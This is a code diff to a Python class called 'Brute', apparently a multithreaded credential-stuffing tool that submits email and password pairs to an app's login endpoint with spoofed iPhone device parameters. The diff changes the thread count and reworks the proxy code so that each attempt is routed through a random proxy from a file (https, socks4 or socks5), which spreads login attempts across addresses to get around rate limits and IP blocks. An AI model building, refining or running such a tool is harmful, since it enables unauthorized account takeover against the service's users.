@@ -26,7 +26,7 @@ class Brute(object):
         self.captcha = 0
         self.running = True
         self.timeout = 15
-        self.thread_count = 250
+        self.thread_count = 150
         self.today = datetime.datetime.today()
         self.lines = []
         self.lock = threading.Lock()
@@ -34,16 +34,10 @@ class Brute(object):
 
     def check(self, login, password):
         
-        
-        if self.proxytype == "https" :
-            proxies = {'https': self.getproxy()}
-        if self.proxytype == "socks4":
-            proxies = {'socks4': self.getproxy()}
-        if self.proxytype == "socks5":
-            proxies = {'socks5': self.getproxy()}
-        if self.proxytype == "burp":
-            proxies = {'https': '127.0.0.1:8080'}
-        
+        if self.proxytype != "burp":
+            proxies = {'https': self.proxytype +  "://" +self.getproxy(), 'http': self.proxytype +  "://" + self.getproxy()}
+        else:
+            proxies = {'https': '127.0.0.1:8080', 'http': '127.0.0.1:8080'}
         
         body = {'user_ab_bucket' : '1927', 'password': password, 'device' : 'Apple%20iPhone', 'app_version' : '25641', 'email' : login}
         try:
@@ -126,7 +120,7 @@ class Brute(object):
         self.lock.release()
 
     def getproxy(self):
-        proxyfile = open('proxy.txt').read().splitlines()
+        proxyfile = open(self.proxyname).read().splitlines()
         return random.choice(proxyfile)
 
     def writelog(self, file, log):
